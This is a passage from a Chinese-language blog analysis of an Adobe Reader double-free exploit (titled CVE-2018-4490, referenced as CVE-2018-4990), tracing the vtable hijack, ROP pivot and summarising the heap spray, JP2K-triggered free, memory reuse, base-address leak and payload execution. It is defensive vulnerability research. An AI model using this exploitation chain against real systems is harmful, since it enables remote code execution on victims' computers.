+<p>我们在<code>rop</code>的第一条指令，<code>0x6b707d06-0x6b640000+dll_base</code>和<code>0x6b68389f-0x6b640000+dll_base</code>分别下断点。对<code>objescript</code>指向的内存位置下内存访问断点。</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200702184608976.png" alt="image-20200702184608976"></p>
+<p>函数断在了<code>objescript+0x598</code>的代码调用处，也就是在执行的之后对象会调用虚函数表中偏移<code>0x598</code>位置的函数。注意到这里的<code>eax</code>值即为<code>objescript</code>的值。</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200702202911620.png" alt="image-20200702202911620"></p>
+<p>在<code>IDA</code>中查看<code>69e325d3</code>部分的代码</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200702203042296.png" alt="image-20200702203042296"></p>
+<p>发生调用的是一个间接调用，我们对返回值<code>69e325d3</code>下断点</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200702203129530.png" alt="image-20200702203129530"></p>
+<p>发现其真正调用的函数是<code>69e6eed4</code>，我们看一下这个函数，在该函数中我们发现了明显的劫持程序流的代码部分</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200702203254745.png" alt="image-20200702203254745"></p>
+<p>首先将虚表指针赋值到eax中，接着调用偏移<code>0x598</code>处的函数，也就劫持了程序流。寄存器交换之后即可以重定向程序流到代码<code>0x6b707d06-0x6b640000+dll_base</code>位置，代码中仍然存在<code>pop esp</code>进一步改变程序流到<code>ROP</code>的第二个指令<code>0x6b78845b,0x6b78845a...</code>最终执行载荷。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>漏洞触发和利用的流程如下</p>
+<ol>
+<li>通过两个<code>Array</code>对象<code>a1</code>和<code>sprayarr</code>创建大量的<code>Unit32Array</code>（buffer大小为0x3f0，堆块可用空间0x400）和<code>ArrayBuffer</code>（buffer大小为0xffe8,堆块可用空间0xfff8）对象，将<code>Unit32Array</code>中的<code>249</code>和<code>250</code>中的元素设置为选定的内存地址(这里攻击者选定的是<code>0x0d0e0048,0x0d0f0048</code>)。</li>
+<li>对<code>a1</code>中的<code>Unit32Array</code>进行间隔释放，造成内存空洞，便于之后对<code>JP2K</code>文件解析时申请的内存落到<code>a1</code>数组范围中。</li>
+<li>调用漏洞触发脚本，通过加载特定的<code>JP2K</code>图片，特定的大小使得分配的内存（大小为<code>0x3f4</code>）落到之前<code>a1</code>释放的某一个<code>Unit32Array.buffer</code>的内存空间中，而0xff使得函数越界释放两个内存指针。这两个内存指针是<code>a1</code>中提前布局好的位于偏移<code>0x3f4,0x3f8</code>位置的脏数据（<code>0x0d0e0040,0d0f0048</code>指针）。两个堆块释放之后合并，堆块大小为<code>0x20000</code>，可用空间<code>0x1fff8</code>。注意到此时<code>sprayarr</code>数组中仍然存在指向<code>0x0d0e0040,0d0f0048</code>内存空间的指针</li>
+<li>通过<code>sprayarr2</code>数组分配<code>0x20000</code>大小的堆块（<code>ArrayBuffer</code>），对上述合并的堆块进行重用。一旦分配成功<code>sprayarr</code>中<code>0d0e0048</code>的<code>ArrayBuffer.buffer</code>中长度就会被改为<code>0x1ffe8</code>，此时既可以通过该<code>buffer</code>访问<code>0d0e0058-0d100040</code>。通过对该常长的<code>buffer</code>修改临近的堆块<code>0d0f0048</code>中的长度为<code>0x66666666</code>，此时即可通过<code>0d0f0048</code>表示的<code>ArrayBuffer.buffer</code>访问全局内存。</li>
+<li>由于<code>Unit32Array.buffer</code>结构体中存在指向父结构<code>Unit32Array</code>的指针，且<code>Unit32Array</code>等结构体中存在指向相关虚函数表的内存指针，因此将<code>sprayarr</code>中<code>0d0f0048</code>之后的<code>buffer</code>重新定义为<code>Unit32Array</code>结构体，找到相关的虚函数表泄露<code>Escript.api</code>库的基址</li>
+<li>伪造<code>bookMarkRoot</code>对象，覆盖<code>execute</code>中执行的某个虚表指针为<code>ROP</code>地址(<code>xchg eax,ebp</code>)，对选自<code>Escript.api</code>库中的<code>ROP</code>地址进行重定位，将<code>ROP</code>和载荷写入到已知地址的地址空间中，通过两次<code>ebp</code>更改执行流，最终执行ROP和载荷。</li>
+</ol>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>攻击者为什么可以确定堆喷之后<code>0d0e0048</code>就是一个<code>ArrayBuffer.buffer</code>的起始位置。申请如此巨大的内存的时候，堆管理器一定会<code>commit</code>一块大的堆段，堆段的起始位置的后四位一定为<code>0</code>，而堆段需要一个<code>0x40</code>大小的<code>HEAP_SEGMENT</code>结构进行管理，因此分配的堆块的起始地址为<code>xxxx0040</code>，<code>ArrayBuffer.buffer</code>申请的大小为<code>0x10000-24</code>，但是实际分配的堆块的大小为<code>0x10000</code>字节，因此后续分配的堆块都将遵循<code>xxxx0040</code>的格式，选择其中相邻的两个即可。</p>
+<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Adobe%E6%BC%8F%E6%B4%9ECVE-2018-4490%E5%88%86%E6%9E%90/image-20200703170403386.png" alt="image-20200703170403386"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.anquanke.com/post/id/188138">PDF调试技巧剖析</a></p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://bbs.pediy.com/thread-250670.htm">Windbg新手入坑指南 </a></p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://bbs.pediy.com/thread-226971.htm">CVE-2018-4990 Acrobat Reader堆内存越界访问释放漏洞分析</a></p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://bbs.pediy.com/thread-250449.htm">对CVE-2018-4990漏洞的补充分析</a></p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.freebuf.com/articles/system/201205.html">CVE-2018-4990漏洞调试分析记录</a></p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.anquanke.com/post/id/146208">CVE-2018-4990 Adobe Reader 代码执行漏洞利用分析</a></p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://srcincite.io/blog/2018/05/21/adobe-me-and-a-double-free.html">Adobe, Me and an Arbitrary Free :: Analyzing the CVE-2018-4990 Zero-Day Exploit</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined" rel="external nofollow noreferrer">LYYL</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.lyyl.online/posts/103439762.html">https://www.lyyl.online/posts/103439762.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.lyyl.online" target="_blank">LYYL' Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-69.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/1545760913.html"><img class="prev-cover" src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-69.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2020 ByteCTF 部分PWN WriteUp</div></div></a></div><div class="next-post pull-right"><a href="/posts/922614085.html"><img class="next-cover" src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-55.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2020 starCTF 部分pwn WriteUp</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">LYYL</div><div class="author-info__description">毋忧拂意，毋喜快心，毋恃久安，毋惮初难。</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/liuzhongchina521"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/liuzhongchina521" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:liuzhongchina521@gmail.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">博客内容为Notion导出markdown，如有错误敬请谅解。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-text">漏洞利用代码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-text">漏洞调试分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90"><span class="toc-text">数据结构分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Array"><span class="toc-text">Array</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ArrayBuffer"><span class="toc-text">ArrayBuffer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unit32Array"><span class="toc-text">Unit32Array</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-text">调试分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%AE%9A%E4%BD%8D"><span class="toc-text">漏洞代码定位</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%81%B6%E6%84%8FJP2K"><span class="toc-text">恶意JP2K</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%8D%E7%94%A8%E5%B7%B2%E7%BB%8F%E9%87%8A%E6%94%BE%E7%9A%84%E5%86%85%E5%AD%98"><span class="toc-text">重用已经释放的内存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2Escript-api%E5%9F%BA%E5%9D%80"><span class="toc-text">泄露Escript.api基址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81%E7%A8%8B%E5%BA%8F%E6%B5%81%EF%BC%8CROP%E6%89%A7%E8%A1%8C%E8%BD%BD%E8%8D%B7"><span class="toc-text">劫持程序流，ROP执行载荷</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-text">补充</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/95726211.html" title="AFL源码及流程分析"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-3.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="AFL源码及流程分析"/></a><div class="content"><a class="title" href="/posts/95726211.html" title="AFL源码及流程分析">AFL源码及流程分析</a><time datetime="2022-05-26T07:20:45.000Z" title="发表于 2022-05-26 15:20:45">2022-05-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/1029211104.html" title="V8 重新入门-2019 starCTF oob 题解"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-37.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="V8 重新入门-2019 starCTF oob 题解"/></a><div class="content"><a class="title" href="/posts/1029211104.html" title="V8 重新入门-2019 starCTF oob 题解">V8 重新入门-2019 starCTF oob 题解</a><time datetime="2021-11-05T14:20:21.000Z" title="发表于 2021-11-05 22:20:21">2021-11-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/1864456601.html" title="2021 0CTF/TCTF Final Naive Heap"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-57.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2021 0CTF/TCTF Final Naive Heap"/></a><div class="content"><a class="title" href="/posts/1864456601.html" title="2021 0CTF/TCTF Final Naive Heap">2021 0CTF/TCTF Final Naive Heap</a><time datetime="2021-09-29T02:18:50.000Z" title="发表于 2021-09-29 10:18:50">2021-09-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/2427305175.html" title="虚拟机逃逸&amp;漏洞复现"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-17.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="虚拟机逃逸&amp;漏洞复现"/></a><div class="content"><a class="title" href="/posts/2427305175.html" title="虚拟机逃逸&amp;漏洞复现">虚拟机逃逸&amp;漏洞复现</a><time datetime="2021-08-18T05:34:33.000Z" title="发表于 2021-08-18 13:34:33">2021-08-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/3705072996.html" title="2021 XCTF Final 线下WP"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-32.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2021 XCTF Final 线下WP"/></a><div class="content"><a class="title" href="/posts/3705072996.html" title="2021 XCTF Final 线下WP">2021 XCTF Final 线下WP</a><time datetime="2021-07-30T07:26:18.000Z" title="发表于 2021-07-30 15:26:18">2021-07-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By LYYL</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'https://www.lyyl.online/posts/103439762.html'
+    this.page.identifier = 'posts/103439762.html'
+    this.page.title = 'Adobe漏洞CVE-2018-4490分析'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://lyyl-online.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Disqus' === 'Disqus' || !false) {
+  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
